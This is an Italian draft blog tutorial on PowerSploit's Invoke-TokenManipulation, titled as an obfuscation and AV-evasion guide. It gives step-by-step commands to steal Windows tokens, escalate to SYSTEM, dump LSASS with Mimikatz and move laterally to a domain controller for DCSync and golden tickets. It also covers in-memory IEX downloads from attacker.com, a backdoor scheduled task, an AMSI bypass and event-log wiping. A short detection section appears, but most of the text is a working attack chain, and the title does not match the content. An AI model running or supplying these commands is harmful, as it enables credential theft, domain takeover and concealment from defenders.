---
title: 'Invoke-Manipulation: PowerShell Obfuscation per Evasion AV'
slug: invokemanipulation
description: Invoke-Manipulation è un modulo PowerShell per offuscare script e bypassare controlli statici durante operazioni di red team autorizzate.
image: /Gemini_Generated_Image_c1r03dc1r03dc1r0.webp
draft: true
date: 2026-02-15T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - powershell
  - obfuscation
---

Invoke-TokenManipulation è uno script PowerShell sviluppato da Joe Bialek (@clymb3r) per PowerSploit che implementa funzionalità di token theft e impersonation simili al modulo incognito di Meterpreter. Il tool permette di enumerare security token disponibili sul sistema, rubare token da processi in esecuzione e creare nuovi processi con privilegi elevati attraverso impersonation.

Il token manipulation è una tecnica post-exploitation fondamentale in ambienti Windows enterprise. Quando hai ottenuto accesso amministrativo locale su un sistema, Invoke-TokenManipulation ti permette di assumere l'identità di altri utenti (inclusi Domain Admin) logged in sul sistema senza conoscerne la password, bypassando autenticazione e enabling lateral movement stealth.

In questa guida impari a usare Invoke-TokenManipulation per privilege escalation da local admin a SYSTEM, impersonation di Domain Admin token per network authentication, integrazione con [PsExec](https://hackita.it/articoli/psexec) per lateral movement, e capire le differenze critiche tra LogonType che determinano quali token sono utilizzabili per autenticazione remota.

## Setup e Installazione

**Repository:** [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (ARCHIVED 2021)
**Script:** `PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1`
**Autore:** Joe Bialek (@clymb3r)
**Versione:** 1.11

### Download Script

```powershell
# Clone PowerSploit repo
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit/Exfiltration

# Oppure download diretto
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1" -OutFile Invoke-TokenManipulation.ps1
```

### Caricamento in Sessione

```powershell
# Import modulo
Import-Module .\Invoke-TokenManipulation.ps1

# Oppure dot-source
. .\Invoke-TokenManipulation.ps1

# Oppure da remoto (in-memory)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-TokenManipulation.ps1')
```

### Verifica Funzionamento

```powershell
PS C:\> Get-Command Invoke-TokenManipulation

CommandType     Name                      Version    Source
-----------     ----                      -------    ------
Function        Invoke-TokenManipulation  1.11       
```

**Privilegi richiesti:**

* **SeDebugPrivilege**: Per accesso token cross-process
* **SeImpersonatePrivilege**: Per impersonation (standard per Administrators)

```powershell
# Verifica privilegi correnti
whoami /priv | Select-String "SeDebug\|SeImpersonate"
```

**Output atteso:**

```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeDebugPrivilege              Debug programs                                Disabled
```

Se `SeDebugPrivilege` è Disabled, PowerShell può enablearlo dinamicamente quando necessario.

## Uso Base

### Enumerazione Token Disponibili

```powershell
Invoke-TokenManipulation -Enumerate
```

**Output:**

```
ProcessId    LogonType    Username                    
---------    ---------    --------                    
808          Service      NT AUTHORITY\SYSTEM        
1520         Interactive  CORP\Administrator         
2344         Interactive  CORP\mario.rossi           
3456         Network      CORP\backup_service         
4120         Batch        CORP\scheduled_task         
5678         Service      NT AUTHORITY\NETWORK SERVICE
```

**Interpretazione:**

* **ProcessId**: PID del processo che possiede il token
* **LogonType**: Tipo di logon (critico per network authentication)
* **Username**: Identità associata al token

### Token Impersonation Thread-Level

```powershell
# Impersona utente specifico (thread-level)
Invoke-TokenManipulation -ImpersonateUser -Username "CORP\Administrator"
```

**Output:**

```
[+] Successfully elevated to Administrator
```

**Verifica:**

```powershell
whoami
# Output: corp\administrator
```

**Nota:** Impersonation è a livello thread PowerShell corrente. Per azioni persistenti usa `-CreateProcess`.

### Crea Processo con Token Rubato

```powershell
# Crea cmd.exe come SYSTEM
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

# Crea PowerShell come Administrator
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "CORP\Administrator"
```

**Output:**

```
[+] Successfully created process as NT AUTHORITY\SYSTEM
[+] Process ID: 6832
```

Nuovo processo `cmd.exe` con PID 6832 esegue come SYSTEM.

### Revert Impersonation

```powershell
# Torna all'identità originale
Invoke-TokenManipulation -RevToSelf
```

**Output:**

```
[+] Reverted thread token
```

### Parametri Fondamentali

| Parametro          | Funzione                          | Uso Tipico                       |
| ------------------ | --------------------------------- | -------------------------------- |
| `-Enumerate`       | Lista token disponibili           | Ricognizione iniziale            |
| `-ImpersonateUser` | Impersona username (thread-level) | Quick test, enumeration          |
| `-CreateProcess`   | Crea processo con token rubato    | Persistent access, lateral prep  |
| `-Username`        | Target username                   | Specifica identità da rubare     |
| `-ProcessId`       | Target process ID                 | Ruba token da processo specifico |
| `-RevToSelf`       | Revert impersonation              | Cleanup                          |

## Tecniche Operative

### LogonType: Il Fattore Critico

**Differenza fondamentale:** Non tutti i token permettono network authentication.

| LogonType            | Value | Network Auth? | Esempio            |
| -------------------- | ----- | ------------- | ------------------ |
| **Interactive**      | 2     | ✓ Yes         | Console logon, RDP |
| **Network**          | 3     | ✗ No          | SMB, WinRM session |
| **Batch**            | 4     | ✓ Yes         | Scheduled task     |
| **Service**          | 5     | ✓ Yes         | Windows service    |
| **NetworkCleartext** | 8     | ✓ Yes         | IIS Basic Auth     |
| **NewCredentials**   | 9     | ✓ Yes         | RunAs /netonly     |

**Regola pratica:** Token da Network Logon (Type 3) **NON possono** autenticarsi a sistemi remoti. Token mancano credenziali cached.

**Esempio pratico:**

```powershell
# Enumera token
Invoke-TokenManipulation -Enumerate

# Output mostra:
# ProcessId: 2344, LogonType: Interactive, Username: CORP\Administrator
# ProcessId: 3456, LogonType: Network, Username: CORP\Administrator

# Impersona Interactive token (funziona per network auth)
Invoke-TokenManipulation -ImpersonateUser -Username "CORP\Administrator" -ProcessId 2344

# Test network auth
net use \\DC01\C$ /user:CORP\Administrator
# Success!

# Impersona Network token (fallisce per network auth)
Invoke-TokenManipulation -ImpersonateUser -Username "CORP\Administrator" -ProcessId 3456

# Test network auth
net use \\DC01\C$ /user:CORP\Administrator
# Error: Logon failure
```

### Escalation Local Admin → SYSTEM

```powershell
# Metodo 1: Impersona SYSTEM thread-level
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Verifica
whoami
# Output: nt authority\system

# Metodo 2: Crea processo come SYSTEM (preferito)
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"
```

**Nuovo PowerShell window apre con privilegi SYSTEM** → pieno controllo sistema.

### Token Theft da ProcessId Specifico

```powershell
# Identifica processo target
Get-Process | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object Id, Name, @{Name="Owner";Expression={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User}}

# Output:
# Id    Name      Owner
# 2344  explorer  Administrator

# Ruba token da processo specifico
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 2344
```

Crea `cmd.exe` con token rubato da explorer.exe del Domain Administrator.

### Bypass UAC con Token

```powershell
# Se sei admin ma UAC blocca, ruba token elevated
$elevated = Get-Process | Where-Object {$_.ProcessName -eq "services" -or $_.ProcessName -eq "winlogon"} | Select-Object -First 1

Invoke-TokenManipulation -CreateProcess "powershell.exe" -ProcessId $elevated.Id
```

Nuovo PowerShell con token SYSTEM bypassa UAC.

## Tecniche Avanzate

### Chaining con Mimikatz

Token impersonation + Mimikatz = credential extraction con privilegi elevati.

```powershell
# Escalate to SYSTEM
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"

# Nel nuovo PowerShell SYSTEM:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

SYSTEM privilege garantisce accesso LSASS memory senza restrizioni.

### Lateral Movement Prep

```powershell
# Trova Domain Admin logged in
Invoke-TokenManipulation -Enumerate | Where-Object {$_.Username -like "*\Administrator" -and $_.LogonType -ne "Network"}

# Output:
# ProcessId: 1520, LogonType: Interactive, Username: CORP\Administrator

# Crea processo come DA
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "CORP\Administrator"

# Nel nuovo cmd (DA context):
# Test network authentication
net use \\DC01\C$
# Success - hai network auth capability!

# PsExec to DC
psexec.exe \\DC01 cmd.exe
```

### Persistence via Service Token

```powershell
# Identifica service con Domain Admin context
Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "CORP\Administrator"} | Select Name, StartName, ProcessId

# Ruba token service
Invoke-TokenManipulation -CreateProcess "powershell.exe" -ProcessId [SERVICE_PID]
```

Service token persiste attraverso reboots se service è impostato per auto-start.

### Token Refresh Loop

```powershell
# Script monitor continuo per nuovi DA token
while ($true) {
    $da_tokens = Invoke-TokenManipulation -Enumerate | Where-Object {
        $_.Username -like "*\Administrator" -and 
        $_.LogonType -eq "Interactive"
    }
    
    if ($da_tokens) {
        Write-Host "[+] Domain Admin token found!" -ForegroundColor Green
        $da_tokens | Format-Table
        
        # Auto-escalate
        Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username $da_tokens[0].Username
        break
    }
    
    Start-Sleep -Seconds 60
}
```

Monitora ogni minuto per DA logon → escalate automaticamente.

## Scenari Pratici

### Scenario 1: Local Admin → SYSTEM Escalation

**Contesto:** Hai local admin, vuoi SYSTEM per LSASS dump.
**Timeline:** \<1 minuto

**Comando:**

```powershell
# Load script
IEX (Get-Content Invoke-TokenManipulation.ps1 -Raw)

# Enumera token SYSTEM
Invoke-TokenManipulation -Enumerate | Where-Object {$_.Username -eq "NT AUTHORITY\SYSTEM"}

# Crea PowerShell come SYSTEM
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"
```

**Output atteso:**

```
[+] Successfully created process as NT AUTHORITY\SYSTEM
[+] Process ID: 7264
```

**Verifica:**

Nuovo PowerShell window apre. Esegui `whoami`:

```
nt authority\system
```

**Exploitation:**

```powershell
# Ora con SYSTEM, dump LSASS
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Oppure procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Cosa fare se fallisce:**

**Errore:** "Access Denied - could not open process"

* **Causa:** Antivirus blocca process access
* **Fix:** Disabilita AV temporaneamente oppure usa [SafetyKatz](https://hackita.it/articoli/safetykatz) invece di Mimikatz

**Errore:** "No SYSTEM tokens found"

* **Causa:** Improbabile, servizi Windows sempre presenti
* **Fix:** Verifica output Enumerate completo, cerca service tokens

**Nuovo PowerShell non apre:**

* **Causa:** UAC o AppLocker blocca
* **Fix:** Usa `-CreateProcess "cmd.exe"` invece, poi lancia PowerShell manualmente

### Scenario 2: Domain Admin Token Theft

**Contesto:** Domain Admin ha sessione RDP aperta su workstation compromessa.
**Timeline:** 2-3 minuti

**Step 1 - Enumeration:**

```powershell
Invoke-TokenManipulation -Enumerate | Format-Table -AutoSize
```

**Output:**

```
ProcessId LogonType    Username                    
--------- ---------    --------                    
808       Service      NT AUTHORITY\SYSTEM        
1520      Interactive  CORP\Administrator         
2344      Interactive  CORP\mario.rossi           
4120      Network      CORP\backup_service         
```

**Target:** ProcessId 1520, LogonType Interactive, CORP\Administrator

**Step 2 - Token theft:**

```powershell
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "CORP\Administrator"
```

**Output:**

```
[+] Successfully created process as CORP\Administrator
[+] Process ID: 8456
```

**Step 3 - Network authentication test:**

Nel nuovo PowerShell (PID 8456):

```powershell
whoami
# Output: corp\administrator

# Test SMB to DC
net use \\DC01\C$
# Output: The command completed successfully

# Map domain admin share
dir \\DC01\C$\Users\Administrator\Desktop
```

**Success:** Hai network authentication capability come Domain Admin.

**Step 4 - Lateral movement:**

```powershell
# PSExec to DC
.\psexec.exe \\DC01 cmd.exe

# Oppure WMI
wmic /node:DC01 /user:CORP\Administrator process call create "cmd.exe /c whoami > C:\output.txt"
```

**Cosa fare se fallisce:**

**Errore:** "Logon failure" su network auth test

* **Causa:** Token è LogonType Network (3), non Interactive
* **Fix:** Cerca altro token con LogonType Interactive, Batch o Service

```powershell
Invoke-TokenManipulation -Enumerate | Where-Object {
    $_.Username -eq "CORP\Administrator" -and 
    $_.LogonType -ne "Network"
}
```

**Nessun Domain Admin token trovato:**

* **Causa:** DA non attualmente logged in
* **Fix:** Attendi DA logon, oppure usa [Responder](https://hackita.it/articoli/responder) per catturare hash e pass-the-hash

**Lateral movement fallisce con "Access Denied":**

* **Causa:** DA ha MFA o smart card requirement
* **Fix:** Token non trasporta smart card credential, usa invece credential theft via [Mimikatz](https://hackita.it/articoli/mimikatz)

### Scenario 3: Scheduled Task Token Abuse

**Contesto:** Scheduled task esegue come Domain Admin ogni ora, vuoi persistenza.
**Timeline:** Variabile (dipende da scheduling)

**Step 1 - Identify scheduled task:**

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*Administrator*"} | Select TaskName, State, @{Name="User";Expression={$_.Principal.UserId}}
```

**Output:**

```
TaskName          State   User
--------          -----   ----
BackupDaily       Ready   CORP\Administrator
ReportGeneration  Running CORP\Administrator
```

**Step 2 - Wait for execution:**

```powershell
# Monitor process creation
while ($true) {
    $tasks = Get-Process | Where-Object {
        (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User -eq "Administrator"
    }
    
    if ($tasks) {
        Write-Host "[+] Administrator process detected: $($tasks.ProcessName) PID: $($tasks.Id)"
        
        # Steal token immediately
        Invoke-TokenManipulation -CreateProcess "powershell.exe" -ProcessId $tasks.Id
        break
    }
    
    Start-Sleep -Seconds 10
}
```

**Step 3 - Exploitation:**

Quando task esegue (es. alle 2:00 AM):

```
[+] Administrator process detected: ReportGeneration.exe PID: 9234
[+] Successfully created process as CORP\Administrator
[+] Process ID: 9458
```

**Nuovo PowerShell (PID 9458) ha DA privileges.**

**Step 4 - Persistent backdoor:**

```powershell
# Nel PowerShell DA:
# Crea nuovo scheduled task con backdoor
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

$trigger = New-ScheduledTaskTrigger -Daily -At 3am

Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -User "CORP\Administrator" -Password "NotNeeded" -RunLevel Highest
```

**Backdoor esegue come DA ogni giorno alle 3am.**

**Cosa fare se fallisce:**

**Process termina prima di steal:**

* **Causa:** Task execution è breve (pochi secondi)
* **Fix:** Usa faster monitoring:

```powershell
# Sysmon Event 1 monitoring più reattivo
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 1 -Wait | ForEach-Object {
    if ($_.Properties[5].Value -like "*Administrator*") {
        $pid = $_.Properties[3].Value
        Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId $pid
    }
}
```

**"Process has exited" error:**

* **Causa:** Hai rubato token ma processo source è terminato
* **Fix:** Normale, token rimane valido anche dopo processo source termination. Procedi con exploitation.

**Task non appare in Get-ScheduledTask:**

* **Causa:** Task nascosto o non registrato in Task Scheduler
* **Fix:** Usa `schtasks /query /v` per vista completa, oppure monitora process creation generale

## Toolchain Integration

### Flusso Privilege Escalation Chain

```
Initial Access → Invoke-TokenManipulation (SYSTEM) → Mimikatz (cred dump) → Lateral Movement
```

**Passaggio dati pratico:**

```powershell
# Step 1: Escalate to SYSTEM
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"

# Step 2: Nel nuovo PowerShell SYSTEM, dump creds
.\mimikatz.exe "sekurlsa::logonpasswords" "exit" > creds.txt

# Step 3: Parse NTLM hash
$ntlm = Select-String "NTLM : " creds.txt | Select -First 1
$hash = $ntlm -replace ".*NTLM : ", ""

# Step 4: Pass-the-Hash con Impacket
psexec.py -hashes ":$hash" CORP/Administrator@192.168.1.100
```

### Invoke-TokenManipulation vs Alternatives

| Feature                   | Invoke-TokenManipulation | Incognito (Meterpreter) | Cobalt Strike            |
| ------------------------- | ------------------------ | ----------------------- | ------------------------ |
| **Platform**              | PowerShell               | Meterpreter             | Beacon                   |
| **Token enumeration**     | Sì                       | Sì                      | Sì (`steal_token`)       |
| **Process creation**      | Sì (`-CreateProcess`)    | Limited                 | Sì (`spawn`)             |
| **Token storage**         | No                       | No                      | Sì (token store CS 4.8+) |
| **Pass-the-Hash**         | No                       | Limited                 | Sì (`pth`)               |
| **Direct syscalls**       | No                       | No                      | Sì (CS 4.8+)             |
| **AMSI/ETW**              | Detected                 | N/A (native)            | Patchable                |
| **Detection rate (2025)** | Alto                     | Medio                   | Medio-Basso              |

**Quando usare Invoke-TokenManipulation:**

* Hai PowerShell access
* Quick token theft per testing
* No C2 framework disponibile
* Engagement short-term

**Quando usare Cobalt Strike:**

* Enterprise engagement long-term
* Necessità token persistence
* Multiple operators
* Advanced evasion requirements

### Integration con PsExec

```powershell
# Step 1: Token theft DA
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "CORP\Administrator"

# Step 2: Nel cmd DA context
# PsExec to DC
psexec.exe \\DC01 -s cmd.exe

# Oppure remoto con explicit creds (se hai password)
psexec.exe \\DC01 -u CORP\Administrator -p Password123! cmd.exe
```

**Vantaggio:** Token theft evita necessità password, silent lateral movement.

Vedi [PsExec guide](https://hackita.it/articoli/psexec) per lateral movement completo.

### Integration con [Mimikatz](https://hackita.it/articoli/mimikatz)

```powershell
# Escalate to SYSTEM first
Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"

# Nel PowerShell SYSTEM:
# Method 1: Traditional Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Method 2: Invoke-Mimikatz (PowerShell wrapper)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

## Attack Chain Completa

### Workstation Compromise → Domain Admin

**Fase 1: Initial Access (T+0)**

Phishing → Meterpreter shell su workstation utente standard.

**Fase 2: Local Privilege Escalation (T+15min)**

```bash
# Upload Invoke-TokenManipulation
meterpreter> upload Invoke-TokenManipulation.ps1 C:\\Temp\\itm.ps1

# Shell to PowerShell
meterpreter> shell
C:\> powershell -ep bypass
```

```powershell
PS> Import-Module C:\Temp\itm.ps1

# Escalate to local admin (via UAC bypass o exploit)
# [privilege escalation phase omitted]

# Ora con local admin, escalate to SYSTEM
PS> Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "NT AUTHORITY\SYSTEM"
```

**Fase 3: Credential Harvesting (T+30min)**

Nel PowerShell SYSTEM:

```powershell
# Dump LSASS
.\mimikatz.exe "sekurlsa::logonpasswords" "exit" > C:\Temp\creds.txt

# Parse credentials
$creds = Select-String "Username|Password|NTLM" C:\Temp\creds.txt
```

**Credenziali trovate:**

```
Username: it_admin
Password: ITAdmin2024!
NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

**Fase 4: Lateral Movement (T+45min)**

```powershell
# Test credentials
net use \\MGMT-SERVER\C$ /user:CORP\it_admin ITAdmin2024!
# Success!

# PsExec to management server
.\psexec.exe \\MGMT-SERVER -u CORP\it_admin -p ITAdmin2024! cmd.exe
```

**Fase 5: Token Hunting (T+1h)**

Su MGMT-SERVER:

```powershell
# Upload Invoke-TokenManipulation
# [transfer phase]

# Enumerate tokens
Invoke-TokenManipulation -Enumerate

# Output mostra:
# ProcessId: 2456, LogonType: Interactive, Username: CORP\Administrator
```

**Domain Admin found!**

```powershell
# Steal DA token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "CORP\Administrator"
```

**Fase 6: Domain Controller Access (T+1h 15min)**

Nel cmd DA:

```cmd
# Network auth to DC
net use \\DC01\C$
# Success

# PSExec to DC
psexec.exe \\DC01 cmd.exe
```

**Fase 7: Domain Compromise (T+1h 30min)**

Su DC01:

```cmd
# DCSync attack
mimikatz.exe "lsadump::dcsync /user:Administrator /domain:corp.local" exit

# Golden ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:[HASH] /ptt" exit
```

**Risultato:** Dominio completamente compromesso via token manipulation chain.

## Detection & Evasion

### Blue Team Monitoring

**Event ID rilevanti:**

| Event ID | Log        | Indicatore                                      |
| -------- | ---------- | ----------------------------------------------- |
| 4673     | Security   | Sensitive privilege use (SeDebugPrivilege)      |
| 4688     | Security   | Process creation con unusual parent             |
| 4624     | Security   | Logon con Impersonation Level                   |
| 4103     | PowerShell | Module logging cattura Invoke-TokenManipulation |
| 4104     | PowerShell | Script block logging (de-obfuscated code)       |

**PowerShell logging cattura:**

```
Event ID 4104 - Script Block Logging
Creating Scriptblock text (1 of 1):
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
```

**Behavioral detection:**

* PowerShell process opening handle a multiple processes (token enumeration)
* Non-service process creating child as SYSTEM
* Process tree anomalies (cmd.exe parent: powershell.exe, owner: SYSTEM)

**Sysmon detection:**

```xml
<Sysmon>
  <RuleGroup name="Token Theft">
    <ProcessAccess onmatch="include">
      <GrantedAccess condition="is">0x1fffff</GrantedAccess>
      <SourceImage condition="contains">powershell</SourceImage>
      <TargetImage condition="contains">winlogon</TargetImage>
    </ProcessAccess>
  </RuleGroup>
</Sysmon>
```

### Tecniche Evasion

**1. AMSI Bypass**

Invoke-TokenManipulation triggerizza AMSI detection. Bypass necessario:

```powershell
# AMSI bypass (uno di molti)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Ora load script
IEX (Get-Content Invoke-TokenManipulation.ps1 -Raw)
```

**2. PowerShell v2 Downgrade**

PowerShell v2 non ha AMSI/script block logging:

```cmd
# Downgrade a PSv2 (se disponibile)
powershell.exe -Version 2 -ep bypass

# Load script (no AMSI)
. .\Invoke-TokenManipulation.ps1
```

**Nota:** Windows 10 1809+ spesso non ha PSv2 installato.

**3. Obfuscation**

```powershell
# String replacement per evadere signature
(Get-Content Invoke-TokenManipulation.ps1) -replace 'Invoke-TokenManipulation','Invoke-TME' | Set-Content ITM_Obf.ps1

# Rename functions interne
# [manual obfuscation required]

# Execute obfuscated version
Import-Module .\ITM_Obf.ps1
Invoke-TME -Enumerate
```

**4. In-Memory Execution via Reflective Loading**

```powershell
# Load senza toccare disco
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-TokenManipulation.ps1')

# Immediate execution
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

# No file artifacts
```

### Cleanup Post-Exploitation

```powershell
# Revert any active impersonation
Invoke-TokenManipulation -RevToSelf

# Elimina script da disco
Remove-Item C:\Temp\Invoke-TokenManipulation.ps1 -Force

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# Clear event logs (requires admin)
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

**Advanced cleanup:**

```powershell
# Kill spawned processes
Get-Process | Where-Object {$_.ProcessName -eq "cmd" -and (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User -eq "SYSTEM"} | Stop-Process -Force

# Clear specific Event IDs
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4673} -MaxEvents 100 | ForEach-Object {
    wevtutil cl Security
}
```

## Performance & Scaling

### Single System Performance

**Token enumeration:**

* Tempo: \<1 secondo
* CPU: \<2%
* Memory: \~30 MB (PowerShell process)

**Token theft + process creation:**

* Tempo: 1-2 secondi
* CPU spike: \~10%
* Memory: +15 MB (new process)

### Multi-Target Lateral Movement

**Scenario:** Token theft su 20 workstation per hunting DA.

**Sequential:**

```powershell
$targets = @("WKSTN-01", "WKSTN-02", ... "WKSTN-20")

foreach ($target in $targets) {
    Invoke-Command -ComputerName $target -ScriptBlock {
        IEX (Get-Content C:\Temp\ITM.ps1 -Raw)
        Invoke-TokenManipulation -Enumerate | Where-Object {$_.Username -like "*Administrator*"}
    }
}

# Tempo: ~60 secondi (3 sec/target)
```

**Parallel:**

```powershell
$targets | ForEach-Object -Parallel {
    Invoke-Command -ComputerName $_ -ScriptBlock {
        IEX (Get-Content C:\Temp\ITM.ps1 -Raw)
        Invoke-TokenManipulation -Enumerate | Where-Object {$_.Username -like "*Administrator*"}
    }
} -ThrottleLimit 10

# Tempo: ~10-15 secondi
```

### Resource Consumption

| Operation                  | CPU      | Memory | Disk I/O |
| -------------------------- | -------- | ------ | -------- |
| Enumerate (50 processes)   | 5%       | 35 MB  | 0        |
| Impersonate (thread)       | \<1%     | +5 MB  | 0        |
| CreateProcess              | 8% spike | +20 MB | Minimal  |
| Continuous monitoring loop | 2-3%     | 40 MB  | 0        |

**Scalabilità:** Invoke-TokenManipulation è lightweight. Può girare su 100+ sistemi simultaneamente senza saturare attacker machine.

## Troubleshooting

### "Access Denied" su Token Enumeration

**Causa:** Privileges insufficienti.

**Diagnosi:**

```powershell
whoami /priv | Select-String "SeDebug"
```

Se `SeDebugPrivilege` è Disabled o assente:

**Fix:**

```powershell
# Abilita SeDebugPrivilege (se sei Administrator)
Enable-Privilege SeDebugPrivilege

# Oppure esegui PowerShell elevated
Start-Process powershell -Verb RunAs
```

### "Could not open process" Error

**Causa:** Protected process (PPL) o Antivirus.

**Diagnosi:**

```powershell
# Verifica se processo è protected
Get-Process -Id [PID] | Select-Object Name, ProcessName, @{Name="Protected";Expression={$_.SafeHandle.IsInvalid}}
```

**Fix:**

* **PPL process:** Usa exploit PPL bypass oppure target altri processi non-protected
* **Antivirus:** Disabilita AV temporaneamente per testing

### "No tokens found" Durante Enumerate

**Causa:** Nessun altro utente logged in.

**Diagnosi:**

```powershell
query user
# Output: No User exists
```

**Fix:**

Attendi user logon oppure forza RDP connection:

```cmd
# Crea RDP session come target user (se hai creds)
cmdkey /generic:TERMSRV/localhost /user:CORP\admin /pass:Password123!
mstsc /v:localhost
```

Questo crea Interactive logon token.

### Token Impersonation Non Permette Network Auth

**Causa:** Token è LogonType Network (3).

**Diagnosi:**

```powershell
Invoke-TokenManipulation -Enumerate | Format-Table
```

Verifica LogonType column.

**Fix:**

```powershell
# Filtra solo token utilizzabili
$usable = Invoke-TokenManipulation -Enumerate | Where-Object {
    $_.LogonType -ne "Network"
}

# Usa questi token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username $usable[0].Username
```

### Script "Not Recognized" dopo Import

**Causa:** Execution policy blocca.

**Fix:**

```powershell
# Set execution policy per sessione corrente
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Poi import
Import-Module .\Invoke-TokenManipulation.ps1
```

**Alternativa:**

```powershell
# Dot-source senza import
. .\Invoke-TokenManipulation.ps1
```

## FAQ

**Invoke-TokenManipulation funziona contro Credential Guard?**

Token manipulation bypassa Credential Guard parzialmente. Credential Guard protegge NTLM hash in LSASS, ma token già presenti in memoria (da utenti logged in) sono accessibili. Steal token di DA logged in via RDP bypassa necessità di hash.

**Differenza tra `-ImpersonateUser` e `-CreateProcess`?**

`-ImpersonateUser` impersona a thread-level del PowerShell corrente (temporaneo, revert quando chiudi PowerShell). `-CreateProcess` crea nuovo processo separato con token rubato (persistente fino a kill del processo). Usa `-CreateProcess` per azioni durature.

**Invoke-TokenManipulation è detectato da EDR?**

Sì, stock script ha alta detection (2025). PowerShell script block logging cattura completamente. Windows Defender, CrowdStrike, Carbon Black rilevano API call patterns (OpenProcessToken, DuplicateTokenEx). Evasion requires: AMSI bypass, obfuscation, PSv2 downgrade dove possibile.

**Posso rubare token senza SeDebugPrivilege?**

No. SeDebugPrivilege è richiesto per OpenProcessToken su processi di altri utenti. Administrator group ha questo privilege per default ma deve essere enabled. Se non hai SeDebugPrivilege, token manipulation non funziona.

**Token stolen persiste dopo source process termination?**

Sì. Una volta duplicato token (DuplicateTokenEx), token reference è indipendente dal processo source. Anche se processo originale termina, token rimane valido fino a reboot o explicit token invalidation.

**Alternative a Invoke-TokenManipulation nel 2025?**

* **Cobalt Strike:** `steal_token`, `make_token` (più stabile, better evasion)
* **Metasploit:** `use incognito` (less stealth)
* **SharpImpersonation** (C#, better OPSEC)
* **Custom C# tool** con direct syscalls per evasion massima

Invoke-TokenManipulation è legacy ma funzionale. Per engagement enterprise 2025, preferisci tooling C# con syscalls diretti.

**LogonType 9 (NewCredentials) è utilizzabile?**

Sì! LogonType 9 (es. `runas /netonly`) crea token con network authentication capability. Cerca questi token:

```powershell
Invoke-TokenManipulation -Enumerate | Where-Object {$_.LogonType -eq "NewCredentials"}
```

## Cheat Sheet

| Comando                                                                             | Descrizione                     |
| ----------------------------------------------------------------------------------- | ------------------------------- |
| `Invoke-TokenManipulation -Enumerate`                                               | Lista tutti i token disponibili |
| `Invoke-TokenManipulation -ImpersonateUser -Username "CORP\admin"`                  | Impersona utente (thread-level) |
| `Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"` | Crea processo come SYSTEM       |
| `Invoke-TokenManipulation -CreateProcess "powershell.exe" -Username "CORP\admin"`   | Crea PowerShell come admin      |
| `Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 1234`                 | Ruba token da PID specifico     |
| `Invoke-TokenManipulation -RevToSelf`                                               | Revert impersonation            |
| `Invoke-TokenManipulation -Enumerate \| Where-Object {$_.Username -like "*admin*"}` | Filtra token admin              |
| `Invoke-TokenManipulation -Enumerate \| Where-Object {$_.LogonType -ne "Network"}`  | Solo token network-auth capable |

**Workflow tipico post-compromise:**

```powershell
# 1. Load script
IEX (Get-Content Invoke-TokenManipulation.ps1 -Raw)

